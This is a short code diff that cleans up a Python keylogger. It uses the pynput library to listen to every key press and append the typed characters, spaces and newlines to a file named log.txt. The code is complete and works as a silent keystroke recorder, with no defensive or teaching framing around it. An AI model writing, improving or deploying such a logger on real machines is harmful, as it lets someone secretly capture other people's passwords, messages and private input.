@@ -1,22 +1,26 @@
-from pynput.keyboard import Key,Listener
+from pynput.keyboard import Key, Listener
 
-def writetofile(key):
-    mess = str(key)
-    mess = mess.replace("'","")
-    
-    if mess == 'Key.space':
+def write_to_file(key):
+    mess = ''
+    if key == Key.space:
         mess = ' '
-    if mess == 'Key.shift_r' or mess == 'Key.shift_l' or mess == 'Key.shift':
-        mess = ''
-    if mess == 'Key.alt_l' or mess == 'Key.alt_r' or mess == 'Key.alt_gr':
-        mess = ''
-    if mess == "Key.ctrl_r" or mess == "Key.ctrl_l" or mess == "Key.ctrl":
-        mess = ""
-    if mess == "Key.enter":
+    elif key == Key.enter:
         mess = "\n"
-    
-    with open("log.txt",'a') as f:
-        f.write(mess)
+    elif key == Key.shift_r or key == Key.shift_l:
+        mess = ''
+    elif key == Key.alt_l or key == Key.alt_r:
+        mess = ''
+    elif key == Key.ctrl_r or key == Key.ctrl_l:
+        mess = ""
+    else:
+        try:
+            mess = str(key.char)
+        except AttributeError:
+            pass
+
         
-with Listener(on_press=writetofile) as l:
+    with open("log.txt", 'a', encoding='utf-8') as f:
+        f.write(str(mess))
+
+with Listener(on_press=write_to_file) as l:
     l.join()
